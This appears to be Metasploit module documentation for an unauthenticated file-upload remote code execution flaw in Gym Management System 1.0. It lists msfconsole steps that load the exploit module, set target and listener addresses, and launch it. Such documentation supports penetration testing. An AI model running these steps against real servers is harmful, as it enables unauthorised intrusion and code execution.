## Description

Gym Management System version 1.0 suffers from an unauthenticated file upload vulnerability allowing remote attackers to gain remote code execution (RCE) on the hosting webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.

## Verification Steps
  1. Start `msfconsole`
  2. Do `use exploit/multi/http/gym_mgmt_system_unauth_rce`
  3. Do `set RHOST ip`
  4. Do `set LHOST ip`
  5. Do `exploit`
